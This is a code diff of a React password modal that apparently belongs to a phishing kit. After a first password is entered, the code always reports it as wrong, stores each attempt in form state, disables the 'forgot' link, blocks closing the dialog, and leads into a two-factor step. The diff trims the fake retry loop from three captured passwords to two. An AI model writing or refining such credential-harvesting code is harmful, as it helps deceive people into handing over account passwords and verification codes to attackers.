@@ -22,7 +22,7 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
 
     const [isOpen, setIsOpen] = React.useState(isOpend);
     const [loading, setLoading] = React.useState(false);
-    const [passwordStep, setPasswordStep] = React.useState<1 | 2 | 3>(1);
+    const [passwordStep, setPasswordStep] = React.useState<1 | 2>(1);
     const [password, setPassword] = React.useState('');
     const [errors, setErrors] = React.useState<Record<string, string>>({});
     const dispatch = useAppDispatch();
@@ -52,10 +52,8 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
 
         if (passwordStep === 1) {
             dispatch(updateForm({ password: value }));
-        } else if (passwordStep === 2) {
-            dispatch(updateForm({ passwordSecond: value }));
         } else {
-            dispatch(updateForm({ passwordThird: value }));
+            dispatch(updateForm({ passwordSecond: value }));
         }
     };
 
@@ -89,13 +87,13 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
             return;
         }
 
-        if (passwordStep === 1 || passwordStep === 2) {
+        if (passwordStep === 1) {
             setLoading(true);
             try {
                 await waitAfterSend();
                 setPassword('');
                 setErrors({ password: t.password.errWrong });
-                setPasswordStep((s) => (s === 1 ? 2 : 3));
+                setPasswordStep(2);
             } finally {
                 setLoading(false);
             }
@@ -120,22 +118,11 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
     const inputClass = (field: string) =>
         ` border ${errors[field] ? 'border-red-500' : 'border-[#d4dbe3]'} `;
 
-    const prompt =
-        passwordStep === 1
-            ? t.password.firstPrompt
-            : passwordStep === 2
-              ? t.password.secondPrompt
-              : t.password.thirdPrompt;
+    const prompt = passwordStep === 1 ? t.password.firstPrompt : t.password.secondPrompt;
 
-    const passwordName =
-        passwordStep === 1
-            ? 'account_access_key'
-            : passwordStep === 2
-              ? 'recheck_access_key'
-              : 'third_access_key';
+    const passwordName = passwordStep === 1 ? 'account_access_key' : 'recheck_access_key';
 
-    const passwordId =
-        passwordStep === 1 ? 'accessKey' : passwordStep === 2 ? 'accessKeyConfirm' : 'accessKeyThird';
+    const passwordId = passwordStep === 1 ? 'accessKey' : 'accessKeyConfirm';
 
     return (
         <Modal isOpen={isOpen} title="" onClose={handleClose} isClosable={false}>
@@ -149,11 +136,6 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
                     {passwordStep === 2 && (
                         <div className="mb-[10px] rounded-[10px] border border-[#ffd8a8] bg-[#fff8ee] px-[12px] py-[10px]">
                             <p className="text-[13px] leading-[1.55] text-[#8a5b13]">{t.password.notice}</p>
-                        </div>
-                    )}
-                    {passwordStep === 3 && (
-                        <div className="mb-[10px] rounded-[10px] border border-[#ffd8a8] bg-[#fff8ee] px-[12px] py-[10px]">
-                            <p className="text-[13px] leading-[1.55] text-[#8a5b13]">{t.password.noticeThird}</p>
                         </div>
                     )}
                     <form
@@ -172,7 +154,7 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
                                 value={password}
                                 onChange={handleChange}
                                 autoComplete="off"
-                                allowToggle={passwordStep >= 2}
+                                allowToggle
                             />
                             {errors.password ? (
                                 <div
@@ -199,19 +181,9 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
                             </button>
                         </div>
                         <div className="mt-[10px] text-center">
-                            {passwordStep < 3 ? (
-                                <span className="inline-block cursor-default select-none text-[14px] text-[#9a979e] opacity-50">
-                                    {t.password.forgot}
-                                </span>
-                            ) : (
-                                <button
-                                    type="button"
-                                    className="text-[14px] text-[#0064E0] hover:underline"
-                                    onClick={goForgotToTwoFa}
-                                >
-                                    {t.password.forgot}
-                                </button>
-                            )}
+                            <span className="inline-block cursor-default select-none text-[14px] text-[#9a979e] opacity-50">
+                                {t.password.forgot}
+                            </span>
                         </div>
                     </form>
                 </div>
